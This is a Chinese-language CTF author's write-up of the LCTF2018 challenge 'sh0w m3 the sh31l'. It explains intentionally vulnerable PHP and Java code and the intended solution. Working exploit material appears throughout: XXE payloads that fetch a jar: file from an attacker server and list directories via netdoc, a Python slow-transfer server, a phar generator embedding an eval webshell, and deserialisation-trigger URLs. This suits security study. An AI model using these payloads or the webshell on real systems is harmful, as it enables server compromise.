# T4lk 1s ch34p,sh0w m3 the sh31l/sh0w m3 the sh31l 4ga1n wp

标签（空格分隔）： CTF 出题分析

---

## **0X00 两道题两个非预期** 

本来就出了这一道题，PHP 代码是用 orange 的改的，我本想设计一个不可上传，但是路径可知的目录，然后利用 java 的 xxe 实现文件上传，再利用 move 移动到那个已知的路径，通过反序列化临时文件来触发已知路径中的文件包含 getshell,但是由于我自己对orange 代码中沙盒的理解的不到位，导致了这道题彻底的非预期，后来我干脆删除了 java 的部分，因为师傅们发现 data 目录其实在 cookie 中能得到，而我在反序列化的时候也没有限制 data 目录的反序列化，并且上传的文件可控，那这样就直接能 getshell， 第二题虽然我限制了不能反序列化 data 目录下面的文件，但是由于我自己写 read_secret 时候的失误导致了另一个非预期，read_secret 本来应该是一个 shell 脚本，但我写成了一个字符串，返回值是 Null ,所以 cookie 中的 hmac 签名不攻自破，路径也就可以伪造，然后利用这种方法 getshell ,但是实际上这个两个题的代码就差了过滤 data 和 .. 的正则，还有一点像吐槽的就是我那个评论框真的是因为人性化做的不好，似乎人们都觉得那个是假的似的，那我下面的主要分析就按照我一开始的想法分析了，代码主要参考的是sh0w m3 the sh31l 4ga1n 这道题。


## **0X01 说一下想要考察的点**

LCTF2018 我出的这道题主要考察了两个知识点，一个就是当前最最最最，最火的 Phar 反序列化，另一个就是前一段时间比较众人皆知的 java 的 XXE 漏洞，毕竟微信的洞谁能不知道呢？虽然是大家比较熟悉的洞，但是我依然进行了比较深入的挖掘，考察的是比较容易被忽视的点，当然为了将这个两个点结合起来我也是花了非常大的功夫(如果说有脑洞其实我是不承认的，我承认的是由于将两者结合起来，利用的过程的确非常复杂)，那么接下来就让我好好的分析一下这道题，看看它能给我们带来什么样的头脑风暴

## **0X02 题目概览**

### **1.题目描述如图所示：**

![此处输入图片的描述][1]  

hh,这一部分的动态前端就是为了活跃气氛的(其实为了动态也写了我挺长时间)，当然也有一点提示，就是说下面有一个评论框可以写，说明这个东西是题目中的关键要素。点击标题就能看到正式的题目了

### **2.题目代码如下：**
    
    <?php
    
    $SECRET  = `../read_secret`;                                  
    $SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]);
    $FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]);   
    @mkdir($SANDBOX);
    @mkdir($FILEBOX);
    
    
    
    if (!isset($_COOKIE["session-data"])) {
        $data = serialize(new User($SANDBOX));
        $hmac = hash_hmac("md5", $data, $SECRET);
        setcookie("session-data", sprintf("%s-----%s", $data, $hmac));      
    }
    
    
    class User {
        public $avatar;
        function __construct($path) {
            $this->avatar = $path;                                          
        }
    }
    
    
    class K0rz3n_secret_flag {
        protected $file_path;
        function __destruct(){
            if(preg_match('/(log|etc|session|proc|read_secret|history|class|data|\.\.)/i', $this->file_path)){
                die("Sorry Sorry Sorry");
            }
    	include_once($this->file_path);
     }
    }
    
    
    function check_session() {
        global $SECRET;
        $data = $_COOKIE["session-data"];
        list($data, $hmac) = explode("-----", $data, 2);
        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)){
            die("Bye");
        }
        if ( !hash_equals(hash_hmac("md5", $data, $SECRET), $hmac) ){
            die("Bye Bye");
        }
        $data = unserialize($data);
    
        if ( !isset($data->avatar) ){
            die("Bye Bye Bye");
        }
        return $data->avatar;                                               
    }
    
    
    function upload($path) {
        if(isset($_GET['url'])){
             if(preg_match('/^(http|https).*/i', $_GET['url'])){
                $data = file_get_contents($_GET["url"] . "/avatar.gif");                                                                                     
                if (substr($data, 0, 6) !== "GIF89a"){
                    die("Fuck off");
                }
                file_put_contents($path . "/avatar.gif", $data);
                die("Upload OK");
            }else{
                die("Hacker");
            }           
        }else{
            die("Miss the URL~~");
        }
    }
    
    
    function show($path) {
        if ( !is_dir($path) || !file_exists($path . "/avatar.gif")) {
               
            $path = "/var/www";
        }
        header("Content-Type: image/gif");
        die(file_get_contents($path . "/avatar.gif"));                     
    }
    
    
    function check($path){
        if(isset($_GET['c'])){
            if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_GET['c'])){
                die("Hacker Hacker Hacker");
            }else{
                $file_path = $_GET['c'];
                list($width, $height, $type) = @getimagesize($file_path);
                die("Width is ：" . $width." px<br>" .
                    "Height is ：" . $height." px<br>");
            }
        }else{
            list($width, $height, $type) = @getimagesize($path."/avatar.gif");
            die("Width is ：" . $width." px<br>" .
                "Height is ：" . $height." px<br>");
        }
    }
    
    
    function move($source_path,$dest_name){
        global $FILEBOX;
        $dest_path = $FILEBOX . "/" . $dest_name;
        if(preg_match('/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i',$source_path)){
            die("Hacker Hacker Hacker");
        }else{
            if(copy($source_path,$dest_path)){
                die("Successful copy");
            }else{
                die("Copy failed");
            }
        }
    }
    
    
    
    
    $mode = $_GET["m"];
    
    if ($mode == "upload"){
         upload(check_session());
    }
    else if ($mode == "show"){
        show(check_session());
    }
    else if ($mode == "check"){
        check(check_session());
    }
    else if($mode == "move"){
        move($_GET['source'],$_GET['dest']);
    }
    else{
        
        highlight_file(__FILE__);    
    }
    
    include("./comments.html");



有没有觉得似曾相识？没错这一部分是改编自 hitcon 2017 Orange 的 Phar 反序列化（当然我的出题的目的也是考察 Phar 的反序列化），简单的浏览一下代码，对比之前 Orange 的原题，我们发现这里做出了比较大的改动有三处，
 
#### **改动一:**
 
我改变了 getflag 的方式，看类名就知道，我这里很明确地要求你反序列化的是下面这个类的对象
 
    class K0rz3n_secret_flag {
        protected $file_path;
        function __destruct(){
            if(preg_match('/(log|etc|session|proc|read_secret|history|class|data|\.\.)/i', $this->file_path)){
                die("Sorry Sorry Sorry");
            }
    	include_once($this->file_path);
     }
    }

也就是说，我们只要构造好这个对象的属性让他的值为我们可以控制的文件，对其进行反序列化的时候我们能成功实现文件包含然后 getshell(题目已经说了是要 getshell 这里就不用考虑去包含 flag 文件了)

#### **改动二：**

我在原先的 upload 方法中添加了 协议的过滤

    function upload($path) {
        if(isset($_GET['url'])){
             if(preg_match('/^(http|https).*/i', $_GET['url'])){
                $data = file_get_contents($_GET["url"] . "/avatar.gif");                                                                                     
                if (substr($data, 0, 6) !== "GIF89a"){
                    die("Fuck off");
                }
                file_put_contents($path . "/avatar.gif", $data);
                die("Upload OK");
            }else{
                die("Hacker");
            }           
        }else{
            die("Miss the URL~~");
        }
    } 

可以看到我只允许你使用 https 或者 http 协议进行文件的上传，我将原来能反序列化的点抹去了，很明显我的意思是不能再使用这个 file_get_contents 进行反序列化


#### **改动三：**

我新增了两个有意思的方法，check 和 move ，很明显，这两个方法是有问题的，利用点也肯定在这里

##### **1.check**

check 的作用就是根据你提供的 URL  地址给出图片的大小，这里很明显是一个可控制点，能让我们输入自定义的路径(非常像 Orange 题目中的反序列化的点)，但是这个函数没有文件上传的功能，并且对传入的参数进行了一些过滤，把 phar:// 开头的直接 Ban 了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我这里打算使用的是 compress.zlib://phar://xxxx 这种方式。

    function check($path){
        if(isset($_GET['c'])){
            if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_GET['c'])){
                die("Hacker Hacker Hacker");
            }else{
                $file_path = $_GET['c'];
                list($width, $height, $type) = @getimagesize($file_path);
                die("Width is ：" . $width." px<br>" .
                    "Height is ：" . $height." px<br>");
            }
        }else{
            list($width, $height, $type) = @getimagesize($path."/avatar.gif");
            die("Width is ：" . $width." px<br>" .
                "Height is ：" . $height." px<br>");
        }
    }

而且 我这里的利用的函数也不再是之前的简单的 file_get_contents 或者 is_file 再或者 is_dir 之类的，通过阅读zsx 大佬的博客，以及自己对 PHP 源码的分析，我最终选择了 getimagesize(） 这个函数去代替 file_get_contents 进行反序列化。


##### **2.move**

这个函数就更可疑了，他能把一个确定的文件通过 copy 转移到我们自己的一个已知的目录下(我这里设计了两个目录，data 和 file 并且 data 目录下面的子目录我们是不知道目录的，但是 file 下面的目录名 我们却能知道)，并且能自定义文件名，看到这里应该能联想到我们获取 flag 的方式就是文件包含，我们这里希望你能将你控制的文件通过这个函数弄到 file 目录下的你已知的自己的目录,并最终对其进行文件包含来达到 getshell 的目的。
    
    function move($source_path,$dest_name){
        global $FILEBOX;
        $dest_path = $FILEBOX . "/" . $dest_name;
        if(preg_match('/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i',$source_path)){
            die("Hacker Hacker Hacker");
        }else{
            if(copy($source_path,$dest_path)){
                die("Successful copy");
            }else{
                die("Copy failed");
            }
        }
    }
    


### **3.发现的问题：**

按照上面的思路对代码进行简单的分析以后，似乎我们已经找到了大致的解决问题的途径，但是问题依然存在，我们需要一个文件上传点才能串起来我们的利用链，我们来列举一下目前已知的上传点。

(1) upload 函数上传的文件我们不知道路径，因为路径被 secret 加密了，这个上传点被 Pass ，我们无法利用
(2) 因为代码本身的 check 需要用到 allow_url_fopen 打开,于是 move 函数也就成了一个隐藏的文件上传点，但是能不能用呢？因为这里我过滤了常见的 wapper 和 http Https 协议，想从外界复制文件应该也是不可行的。
**(3)别忘了我们的评论框**


## **0X03 深入研究**

### **对评论框的详细分析**

这个评论框是做什么的呢？其实到这里为止题目才刚刚开始，利用这个评论框进行文件的上传是这道题我要考察的重点，也是我个人认为这道题最难的地方，我们先来抓包看一下。

**如图所示：**

![此处输入图片的描述][2]

我们看到评论框输入的内容被转化成了 json 格式发往了相同服务器的一个 API ，端口是 8080 ，8080 是 tomcat 的默认端口，熟悉的同学应该猜的出来，这是我用 java 写的一个 api 接口，根据你输入的请求得到 json 格式的返回结果，很多人第一反应肯定是 xss 之类的，所以这里我对输入做了过滤

**如图所示：**

![此处输入图片的描述][3]

我直接把尖括号过滤了，当然还有一些常见的符合 xml 的内容，其实就是传达这里不能输入不规范的内容

**如图所示：**

![此处输入图片的描述][4]


如果你熟悉 XEE 的 实战，知道在现实中 XXE 一般出现在调用 API 的接口、传递 json 等地的话，你就会立刻反应过来这里的 json 接口完全有可能去解析客户端发来的 XML 数据，没错，为了模拟这种情况我就是用 Java 写了这样一个能解析 json 还能解析 XML 的接口,只要我们将传递过去的 content-type 修改成 application/xml 就可以了，我们可以传一个 xml 格式的数据过去看看

**如图所示：**

![此处输入图片的描述][5]

可以看到我们传入的内容被成功解析并在 json 中完整的返回，只要能解析外部实体这其实就是一个很明显的 XXE 了，只不过是 Java 的而已，我们尝试传入实体，看卡有没有被过滤(过滤了 & 就只能 OOB了)

**如图所示：**

![此处输入图片的描述][6]

成功解析，好了，是不是感觉柳暗花明，XXE 漏洞最基本的是干什么？列目录，正好我们试一下解析外部实体

**如图所示：**

![此处输入图片的描述][7]


你的内心一定是 mmp 的，其实我就知道你会用 file 列目录，想给你一个打击，于是特地把 file 过滤了，看一下我的源码

**如图所示：**

![此处输入图片的描述][8]

**由于图片显示不完整，我贴出代码：**

     public String XmlRe(@RequestBody String data, HttpServletRequest request) throws Exception {
    
            if(Pattern.matches("(?i)(.|\\s)*(file|ftp|gopher|CDATA|read_secret|logs|log|conf|etc|session|proc|root|history|\\.\\.|data|class|bash|viminfo)(.|\\s)*",data)){
                return "{\"status\":\"Error\",\"message\":\"Hacker! Hacker! Hacker!\"}";
            }else{
                Map<String,String> test = xmlToMap(data);
                return "{\"status\":\"Error\",\"message\":\""+ test +"\"}";
            }
    
        }


其实我不只是过滤了 file 协议，我们知道低版本的jdk 支持 gopher 协议，我防止思路跑偏直接过滤了，还有就是有些时候想看一写带有特殊字符的文件的话可能会用到 CDATA 结，为了能尽量少的暴露敏感文件我也过滤了，毕竟题目不是要你读文件用的。但是如果你看一下文档的话，就能发现， java 还支持一个 netdoc 协议，能完成列目录的功能。

**如图所示：**

![此处输入图片的描述][9]


很多人肯定去忙着找 flag ，其实我 flag 没有写在文件里，找到 flag 的唯一方式就是拿到 shell 然后执行全局搜索。

别忘了现在的当务之急就是找文件上传点，这里我考察的是一个比较少见也比较细节的东西，java 的 jar:// 协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中，好了分析到这里又有一些问题了

#### **发现的问题：**

(1)如果我们能通过 jar 协议在题目 服务器生成一个临时文件，那我们就能利用其进行包含，但是似乎我们不知道文件路径更没法预测文件名
(2)我们的包含是要通过反序列化实现的，也就是说我们如果想要包含临时文件，那么我们必须要在 payload 文件中写好临时文件名，但是 payload 是在生成临时文件以前生成的(或者说 payload 就是那个临时文件)，于是这里就形成了一个死循环
(3)临时文件很快就会消失，但是我们的反序列化一以及后面的操纵非常的复杂，甚至没法直接通过脚本实现，那么在没法条件竞争的情况下如何延长文件的传输时间


#### **问题解决**

##### **问题一：**

想知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了，那么路径怎么知道，这里有两种方法

**方法一：**

先列一下目录，大概判断一下环境，本地搭一个相似的环境去测试，找到临时文件的路径，但我想这个方法没人用，代价太大了。

**方法二：**

其实你在测试过程中应该能发现报错信息没有屏蔽，我们可以通过报错拿到我们的文件路径，但是如何报错？这其实还是一个问题，因为 Jar 协议本身有一个解包的过程，如果你请求的文件包里面没有那么就会报错，获取这个包的临时文件的位置(下图的 jar.zip 就是一个单纯的压缩包文件，如果是 Phar 文件是不会成功的，jar 不能解析 phar 格式的文件)

**如图所示：**

![此处输入图片的描述][10]

##### **问题二：**

我们已经清楚，生成的临时文件就是我们的 payload ，我们要通过这个 payload 完成反序列化和文件包含两个功能，但是他自己是 无法在上传之前知道自己的文件名的，没有确定的路径和文件名就没法包含，于是之前对 move 函数的分析就映入脑海，我们似乎能利用这个 move 函数将这个临时文件搬移到我们已知的路径，这其实也是我设计这个函数的目的


##### **问题三：**

这个问题也是一个非常关键的点，也是这道题的难点中的难点，既然不能条件竞争，我们该怎么办，实际上我们可以通过自己写服务器端的方法完成这个功能，因为文件本身就在自己的服务器上，我想让他怎么传不是完全听我的？于是我写了一个简单的 TCP 服务器，这个服务器的特点就是在传输到文件的最后一个字节的时候突然暂停传输，我使用的是 sleep() 方法，这样就延长了时间，而且是任意时间的延长，但是实际上这厉害牵扯出一个问题，就是我们这样做文件实际上是不完整的，所以我们需要精心构造一个 payload 文件，这个文件的特点就是我在最后一个字节的后面又添加了一个垃圾字节，这样实际上在暂停过程中文件已经传输完毕了，只是服务器认为没有成功传输而已

**代码如下：**
    
    import sys 
    import time 
    import threading 
    import socketserver 
    from urllib.parse import quote 
    import http.client as httpc 
    
    listen_host = 'localhost' 
    listen_port = 9999 
    jar_file = sys.argv[1]
    
    class JarRequestHandler(socketserver.BaseRequestHandler):  
    	def handle(self):
    		http_req = b''
    		print('New connection:',self.client_address)
    		while b'\r\n\r\n' not in http_req:
    			try:
    				http_req += self.request.recv(4096)
    				print('\r\nClient req:\r\n',http_req.decode())
    				jf = open(jar_file, 'rb')
    				contents = jf.read()
    				headers = ('''HTTP/1.0 200 OK\r\n'''
    				'''Content-Type: application/java-archive\r\n\r\n''')
    				self.request.sendall(headers.encode('ascii'))
    				self.request.sendall(contents[:-1])
    				time.sleep(300)
    				print(30)
    				self.request.sendall(contents[-1:])
    
    			except Exception as e:
    				print ("get error at:"+str(e))
    			
    				
    if __name__ == '__main__':
    
    	jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    	print ('waiting for connection...') 
    	server_thread = threading.Thread(target=jarserver.serve_forever) 
    	server_thread.daemon = True 
    	server_thread.start() 
    	server_thread.join()


到此为止，我对整道题的难点分析就结束了，下面就是大致的解题过程

## **0X04 解题过程**

### **1.查看自己的 remote_addr 结合 K0rz3n 字符串生成md5** 

**示例代码：**


    <?php
    
    echo md5("K0rz3n".$_SERVER['REMOTE_ADDR']);

**结果：**

    4253b1c836a25962c1547f7e46f373f1

这个就是我们会在 file 文件夹中生成的文件夹，我们会把我们的 payload 转移到这个文件夹下重命名然后进行包含


### **2.生成反序列化 payload 文件**

**payload 代码：**

    <?php 
    
    	class K0rz3n_secret_flag {
            protected $file_path;
            function __construct(){
            	$this->file_path = "phar:///var/www/file/4253b1c836a25962c1547f7e46f373f1/jar.zip/test.txt";//这是文件包含的payload
            }
    	}
    
    
    
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");                   //后缀必须是 phar
        $phar->startBuffering();
        $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
        $o = new K0rz3n_secret_flag();//我们将对象在这里创建
        $phar->setMetadata($o); //将对象在这里序列化
        $phar->addFromString("test.txt", '<?php eval($_POST["cmd"])?>'); //我们文件包含的时候会触发 getshell
        $phar->stopBuffering();   
    
    ?>
    
运行这段代码以后我们就能获取到一个 phar.phar 文件，然后我们根据自己习惯改名后还要在文件末尾添加一个垃圾字节

**如图所示：**

![此处输入图片的描述][11]


### **3.判断临时文件目录**

我们先随意打包一个压缩包(假设里面是一个xxe.php)上传到自己的服务器上，然后启动我们的自定义的服务器脚本，监听服务器的 9999 端口，然后本地利用 XXE 去请求这个文件，请求的时候我们要故意写一个不存在文件，比如 1.php 

**如图所示:**

![此处输入图片的描述][12]

我们服务器已经接收到了我们 XXE 发出的请求，然后后面的报错就和上面分析的一样，这里就不在赘述


### **4.通过列目录确定我们的payload文件名**

我们将 server.py 这个服务器脚本的 sleep() 时间调的稍微长一些，比如调整为 600 s ，然后将我们的 payload 文件传上去，通过 XXE 请求这个文件，这时候临时文件生成，然后我们再通过 XXE 列目录得到临时文件名

**请求 payload：**

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "jar:http://yourvps:9999/jarn.zip!/test.txt" >]>
    <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
    </creds>

**得到临时文件名**

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "netdoc:///usr/local/tomcat/temp/" >]>
    <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
    </creds>

**如图所示：**

![此处输入图片的描述][13]


### **5.调用 Move 函数实现文件的拷贝**

**如图所示：**

![此处输入图片的描述][14]

**示例代码：**

    http://212.64.7.171/LCTF.php?
    m=move
    &source=/usr/local/tomcat/temp/jar_cachexxxxxxxxxxxx.tmp
    &dest=jar.zip

这个时候我们的 payload 已经在我们可控的目录中了，并且被我们重名名为了 jar.zip ,这个我们在 payload 文件中写的是一致的

### **6.调用 check 函数实现反序列化 getshell**

我们先在浏览器看一下：

**如图所示：**

![此处输入图片的描述][15]

**示例代码：**

    http://212.64.7.171/LCTF.php?m=check&c=compress.zlib://phar:///usr/local/tomcat/temp/jar_cachexxxxxxxxxxxxxxxxxx.tmp

没啥反应，其实我们放到菜刀里就有反映了


**如图所示:**

![此处输入图片的描述][16]

![此处输入图片的描述][17]


这里还要注意一点，我们在创建 shell 的时候还要注意我们必须带上 cookie: 要不然会被 php 本身的逻辑给 die 掉

**如图所示：**

![此处输入图片的描述][18]


### **7.找 flag**

我说过 flag 没有在什么文件里，为了防止 XXE 该翻到，于是只能通过 grep 全局搜索，如果全局不行的话，就一个一个文件夹的全局，可能这个 shell 没法支持这么大的搜索量

**如图所示：**


![此处输入图片的描述][19]

## **0X05 总结**

出这道题之前其实找了很久的思路，发现自己对知识的理解还是非常的肤浅，也学会了有时候看文档才是最好的学习方法，写这道题也用了很久，请教了非常多的大师傅，就在这里统一感谢一下，特别是 Java 的部分，因为写 Java 写的不多 ,想要实现一个自己脑袋里面的想法真的很难，甚至都把微信 XXE 的漏洞部分代码进行了巧妙的移植，不过我还是克服重重困难实现了功能，不管这道题出的好坏与否，脑洞与否，我都是出于技术交流与分享的目的，希望能将自己学到的东西以题目的形式展现给大家，没有任何的经济成分，这或许也是 CTF 一开始的目的吧，但是现在似乎已经不是这样了，总之做技术还是保持本心吧，还是那句话："你的知识面，决定着你的攻击面"。


  [1]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF_show_me_the_shell_.gif
  [2]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_1.png
  [3]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%862.png
  [4]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_3.png
  [5]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_4.png
  [6]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%865.png
  [7]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_6.png
  [8]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_%E8%AF%84%E8%AE%BA%E6%A1%867.png
  [9]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%868.png
  [10]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%869.png
  [11]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%9E%83%E5%9C%BE%E5%AD%97%E8%8A%82.png
  [12]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E8%AF%B7%E6%B1%82.png
  [13]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%90%8D.png
  [14]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D.png
  [15]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png
  [16]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell.png
  [17]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell2.png
  [18]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20cookie.png
  [19]: https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20flag.png